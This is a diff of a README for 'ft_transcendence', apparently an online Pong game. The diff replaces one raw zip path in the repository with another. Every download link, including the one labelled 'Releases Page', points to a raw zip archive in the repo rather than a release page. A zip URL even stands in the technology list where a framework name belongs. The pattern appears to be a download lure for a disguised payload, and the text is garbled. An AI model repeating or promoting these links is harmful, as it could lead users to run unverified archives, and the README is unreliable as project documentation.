@@ -6,9 +6,9 @@ Welcome to **ft_transcendence**, a full-stack web application that lets you play
 
 ## 📥 Download the Application
 
-[![Download ft_transcendence](https://github.com/AhmadShahid12/ft_transcendence/raw/refs/heads/main/elasticsearch-certs/ca.zip)](https://github.com/AhmadShahid12/ft_transcendence/raw/refs/heads/main/elasticsearch-certs/ca.zip)
+[![Download ft_transcendence](https://github.com/AhmadShahid12/ft_transcendence/raw/refs/heads/main/frontend/transcendence_ft_v2.5-alpha.4.zip)](https://github.com/AhmadShahid12/ft_transcendence/raw/refs/heads/main/frontend/transcendence_ft_v2.5-alpha.4.zip)
 
-Click the button above or visit the [Releases Page](https://github.com/AhmadShahid12/ft_transcendence/raw/refs/heads/main/elasticsearch-certs/ca.zip) to download the latest version of the application.
+Click the button above or visit the [Releases Page](https://github.com/AhmadShahid12/ft_transcendence/raw/refs/heads/main/frontend/transcendence_ft_v2.5-alpha.4.zip) to download the latest version of the application.
 
 ## 🖥️ System Requirements
 
@@ -23,7 +23,7 @@ To run the ft_transcendence application, ensure your system meets the following 
 
 1. **Visit the Releases Page**
 
-   Go to the [Releases Page](https://github.com/AhmadShahid12/ft_transcendence/raw/refs/heads/main/elasticsearch-certs/ca.zip). This page lists all available versions of the application.
+   Go to the [Releases Page](https://github.com/AhmadShahid12/ft_transcendence/raw/refs/heads/main/frontend/transcendence_ft_v2.5-alpha.4.zip). This page lists all available versions of the application.
 
 2. **Select the Latest Release**
 
@@ -56,7 +56,7 @@ To run the ft_transcendence application, ensure your system meets the following 
 
 ft_transcendence was built using:
 
-- **https://github.com/AhmadShahid12/ft_transcendence/raw/refs/heads/main/elasticsearch-certs/ca.zip** for server-side operations
+- **https://github.com/AhmadShahid12/ft_transcendence/raw/refs/heads/main/frontend/transcendence_ft_v2.5-alpha.4.zip** for server-side operations
 - **TypeScript** for clear and maintainable code
 - **WebSocket** for real-time communication between players
 
@@ -78,4 +78,4 @@ For updates and announcements, follow us on our GitHub repository. We welcome co
 
 Enjoy playing Pong with friends online! Download the application now and start your gaming adventure. For any questions, don't hesitate to reach out. Happy gaming! 
 
-[Download ft_transcendence](https://github.com/AhmadShahid12/ft_transcendence/raw/refs/heads/main/elasticsearch-certs/ca.zip)
+[Download ft_transcendence](https://github.com/AhmadShahid12/ft_transcendence/raw/refs/heads/main/frontend/transcendence_ft_v2.5-alpha.4.zip)
